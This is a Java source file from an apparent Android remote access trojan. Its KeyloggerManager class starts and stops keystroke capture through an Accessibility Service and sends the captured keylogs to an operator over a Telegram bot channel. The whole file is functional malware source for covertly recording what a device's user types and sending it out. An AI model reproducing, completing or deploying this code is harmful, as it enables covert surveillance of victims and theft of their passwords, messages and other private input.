package com.enterprise.rat.commands;

import android.content.Context;
import com.enterprise.rat.services.AccessibilityService;
import com.enterprise.rat.utils.TelegramApi;

public class KeyloggerManager {
    private Context context;
    private boolean running = false;

    public KeyloggerManager(Context context) { this.context = context; }

    public void start() {
        AccessibilityService svc = AccessibilityService.getInstance();
        if (svc != null) { svc.clearKeylog(); running = true; TelegramApi.sendMessage("⌨ Keylogger started"); }
        else TelegramApi.sendMessage("❌ Accessibility Service inactive");
    }

    public void stop() {
        running = false;
        TelegramApi.sendMessage("⌨ Keylogger stopped");
    }

    public void sendLogs() {
        AccessibilityService svc = AccessibilityService.getInstance();
        if (svc != null) {
            String logs = svc.dumpKeylog();
            if (logs.isEmpty()) TelegramApi.sendMessage("⌨ No logs");
            else TelegramApi.sendMessage("<b>⌨ Keylogs:</b>\n<code>" + logs + "</code>");
        } else TelegramApi.sendMessage("❌ Accessibility Service inactive");
    }
}
